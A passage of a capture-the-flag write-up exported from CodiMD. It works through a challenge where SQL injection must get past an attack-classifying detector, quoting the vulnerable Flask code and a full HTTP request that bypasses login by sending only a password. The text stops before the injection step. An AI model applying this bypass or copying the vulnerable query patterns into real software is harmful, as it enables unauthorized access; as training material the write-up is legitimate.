@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        Hack into Skynets - CodiMD
+    </title>
+    <link rel="icon" type="image/png" href="http://157.245.54.211:3000/favicon.png">
+    <link rel="apple-touch-icon" href="http://157.245.54.211:3000/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.0/css/bootstrap.min.css" integrity="sha256-H0KfTigpUV+0/5tn2HXC0CPwhhDhWgSawJdnFd0CGCo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fork-awesome/1.1.3/css/fork-awesome.min.css" integrity="sha256-ZhApazu+kejqTYhMF+1DzNKjIzP7KXu6AzyXcC1gMus=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,600,600italic,300italic,300|Source+Serif+Pro|Source+Code+Pro:400,300,500&subset=latin,latin-ext);.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{padding:0 1em;color:#777;border-left:.25em solid #ddd}.night .markdown-body blockquote{color:#bcbcbc}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.night .markdown-body h1,.night .markdown-body h2,.night .markdown-body h3,.night .markdown-body h4,.night .markdown-body h5,.night .markdown-body h6{color:#ddd}.markdown-body h1 .fa-link,.markdown-body h2 .fa-link,.markdown-body h3 .fa-link,.markdown-body h4 .fa-link,.markdown-body h5 .fa-link,.markdown-body h6 .fa-link{color:#000;vertical-align:middle;visibility:hidden;font-size:16px}.night .markdown-body h1 .fa-link,.night .markdown-body h2 .fa-link,.night .markdown-body h3 .fa-link,.night .markdown-body h4 .fa-link,.night .markdown-body h5 .fa-link,.night .markdown-body h6 .fa-link{color:#fff}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .fa-link,.markdown-body h2:hover .anchor .fa-link,.markdown-body h3:hover .anchor .fa-link,.markdown-body h4:hover .anchor .fa-link,.markdown-body h5:hover .anchor .fa-link,.markdown-body h6:hover .anchor .fa-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.night .markdown-body table tr{background-color:#5f5f5f}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.night .markdown-body table tr:nth-child(2n){background-color:#4f4f4f}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:.2em 0;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.night .markdown-body code,.night .markdown-body tt{color:#eee;background-color:hsla(0,0%,90.2%,.36)}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\A0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid;border-color:#ccc #ccc #bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{border:inherit!important}.night .markdown-body pre{filter:invert(100%)}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-webkit-inline-flex;display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.night .markdown-body .gist table tr:nth-child(2n){background-color:#ddd}.markdown-body code[data-gist-id]{background:none;padding:0;filter:invert(100%)}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.geo,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.night .markdown-body pre.graphviz .graph>polygon{fill:#333}.night .markdown-body pre.mermaid .sectionTitle,.night .markdown-body pre.mermaid .titleText,.night .markdown-body pre.mermaid text{fill:#fff}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.night .markdown-body .abc path{fill:#eee}.night .markdown-body .abc path.note_selected{fill:##4DD0E1}.night tspan{fill:#fefefe}.night pre rect{fill:transparent}.night pre.flow-chart path,.night pre.flow-chart rect{stroke:#fff}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body img{background-color:transparent}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;-webkit-transition:opacity .2s;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;-webkit-transition:opacity .2s;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.geo-map{width:100%;height:250px}.markmap-container{height:300px}.markmap-container>svg{width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.9;background-color:#ccc;border:none}.ui-toc-label,.ui-toc .open .ui-toc-label{-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#5f5f5f}.ui-toc-label:focus{opacity:1;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;-webkit-transition:opacity .2s;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child>ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.night .ui-toc-dropdown .nav>li>a:focus,.night .ui-toc-dropdown .nav>li>a:hover{color:#fff;border-left-color:#fff}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.night .ui-toc-dropdown .nav>.active:focus>a,.night .ui-toc-dropdown .nav>.active:hover>a,.night .ui-toc-dropdown .nav>.active>a{color:#fff;border-left:2px solid #fff}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.night .ui-toc-dropdown .nav>li>a{color:#aaa}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,Hiragino Kaku Gothic Pro,"\30D2\30E9\30AE\30CE\89D2\30B4   Pro W3",Osaka,Meiryo,"\30E1\30A4\30EA\30AA",MS Gothic,"\FF2D\FF33   \30B4\30B7\30C3\30AF",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,"\FF2D\FF33   \FF30\30B4\30B7\30C3\30AF",sans-serif}.markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang TC,Microsoft JhengHei,"\5FAE\8EDF\6B63\9ED1",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,"\5FAE\8EDF\6B63\9ED1UI",sans-serif}.markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft YaHei,"\5FAE\8F6F\96C5\9ED1",sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}.ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,"\5FAE\8F6F\96C5\9ED1UI",sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:rgba(0,0,0,.85)}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:contain}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}small span{line-height:22px}small .dropdown{display:inline-block}small .dropdown a:focus,small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-khtml-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}.night .navbar{background:#333;border-bottom-color:#333;color:#eee}.night .navbar a{color:#eee}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid"><h1 id="Hack-into-Skynets"><a class="anchor hidden-xs" href="#Hack-into-Skynets" title="Hack-into-Skynets"><i class="fa fa-link"></i></a>Hack into Skynets</h1><ol>
+<li>Skynet is a blackbox detection engine which is not provided. But you don’t have to guess.</li>
+<li>Scanner or sqlmap not required to solve this challenge, please do not use scanners.</li>
+</ol><p>Target (Either 1 will do):</p><ol>
+<li><a href="http://47.242.21.212:8081" target="_blank" rel="noopener">Target 1</a></li>
+<li><a href="http://47.242.21.212:8082" target="_blank" rel="noopener">Target 2</a></li>
+<li><a href="http://47.242.21.212:8083" target="_blank" rel="noopener">Target 3</a></li>
+<li><a href="http://47.242.21.212:8084" target="_blank" rel="noopener">Target 4</a></li>
+<li><a href="http://47.242.21.212:8085" target="_blank" rel="noopener">Target 5</a></li>
+<li><a href="http://47.242.21.212:8086" target="_blank" rel="noopener">Target 6</a></li>
+</ol><h2 id="Notes"><a class="anchor hidden-xs" href="#Notes" title="Notes"><i class="fa fa-link"></i></a>Notes:</h2><ol>
+<li>Skynet seems like a classification algorithm / ai for detecting attacks
+<ul>
+<li>Not sure if it is <a href="https://www.snbforums.com/threads/skynet-router-firewall-security-enhancements.16798/" target="_blank" rel="noopener">this</a></li>
+</ul>
+</li>
+<li>If the payload seems like an attack, it will abort with 403</li>
+<li>Brute force not required</li>
+<li><code>sql = ("SELECT id, account FROM target_credentials WHERE password = '{}'")</code><br>
+<code>.format(hashlib.md5(password.encode()).hexdigest())</code>. Checks if there exists a hash for the password. <s>Does not care about username</s>
+<ul>
+<li>Actually does care about username in the return. <code>return name == username</code></li>
+</ul>
+</li>
+<li>Goal: SQLi while bypassing Skynet detector</li>
+</ol><p>The following items are checked.</p><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skynet_detect</span><span class="hljs-params">()</span>:</span>
+    req = {
+        <span class="hljs-string">'method'</span>: flask.request.method,
+        <span class="hljs-string">'path'</span>: flask.request.full_path,
+        <span class="hljs-string">'host'</span>: flask.request.headers.get(<span class="hljs-string">'host'</span>),
+        <span class="hljs-string">'content_type'</span>: flask.request.headers.get(<span class="hljs-string">'content-type'</span>),
+        <span class="hljs-string">'useragent'</span>: flask.request.headers.get(<span class="hljs-string">'user-agent'</span>),
+        <span class="hljs-string">'referer'</span>: flask.request.headers.get(<span class="hljs-string">'referer'</span>),
+        <span class="hljs-string">'cookie'</span>: flask.request.headers.get(<span class="hljs-string">'cookie'</span>),
+        <span class="hljs-string">'body'</span>: str(flask.request.get_data()),
+    }
+    _, result = skynet.classify(req)
+    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">and</span> result[<span class="hljs-string">'attack'</span>]
+</code></pre><p>The session cookie seems rather weak. A valid <code>str(datetime.datetime.now())</code> value will not be easy to determine though since the valid is looked up in the database.</p><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_session</span><span class="hljs-params">()</span>:</span>
+    valid_since = datetime.datetime.now()
+    valid_until = datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)
+    sessionid = hashlib.md5((str(valid_since)+str(valid_until)+str(datetime.datetime.now())).encode()).hexdigest()
+
+    sql_exec_update((<span class="hljs-string">"INSERT INTO login_session (sessionid, valid_since, valid_until)"</span>
+           <span class="hljs-string">"  VALUES ('{}', '{}', '{}')"</span>).format(sessionid, valid_since, valid_until))
+    <span class="hljs-keyword">return</span> sessionid
+</code></pre><p>Breakthrough! If we look closely at <code>(1)</code>, it sets user to the default value of ‘’ if no rows were returned. Noting that the method checks that <strong>both</strong> username and password are not empty, we can simply send no username while keeping a bogus password to return no rows. Then it will be checked against the empty string, passing login.</p><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_login_attempt</span><span class="hljs-params">()</span>:</span>
+    username = flask.request.form.get(<span class="hljs-string">'username'</span>, <span class="hljs-string">''</span>)
+    password = flask.request.form.get(<span class="hljs-string">'password'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> password: <span class="hljs-comment">#(2)</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+    sql = (<span class="hljs-string">"SELECT id, account"</span>
+           <span class="hljs-string">"  FROM target_credentials"</span>
+           <span class="hljs-string">"  WHERE password = '{}'"</span>).format(hashlib.md5(password.encode()).hexdigest())
+    user = sql_exec(sql)
+    name = user[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> user[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">''</span> <span class="hljs-comment"># (1)</span>
+    <span class="hljs-keyword">return</span> name == username
+</code></pre><h4 id="🚪-POST-login-HTTP11"><a class="anchor hidden-xs" href="#🚪-POST-login-HTTP11" title="🚪-POST-login-HTTP11"><i class="fa fa-link"></i></a>🚪 POST /login HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST /login HTTP/1.1
+Host: 47.242.21.212:8084
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://47.242.21.212:8084/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Origin: http://47.242.21.212:8084
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+password=a
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 302 FOUND
+Content-Type: text/html; charset=utf-8
+Content-Length: 13
+Set-Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d; Path=/
+Location: http://47.242.21.212:8084/
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 19:36:29 GMT
+
+Login success
+</code></pre><hr><p>After we login we get this interface.</p><p><img src="uploads/upload_c60b95e019c0969017d3cd5ec5d7f213.png" alt="" class="md-image md-image"></p><p>This is the interesting SQLi sink that requires the login:</p><pre><code class="python hljs"><span class="hljs-meta">@app.route('/', methods=['GET', 'POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_query</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">if</span> skynet_detect():
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> query_login_state():
+        response = flask.make_response(<span class="hljs-string">'No login, redirecting'</span>, <span class="hljs-number">302</span>)
+        response.location = flask.escape(<span class="hljs-string">'/login'</span>)
+        <span class="hljs-keyword">return</span> response
+
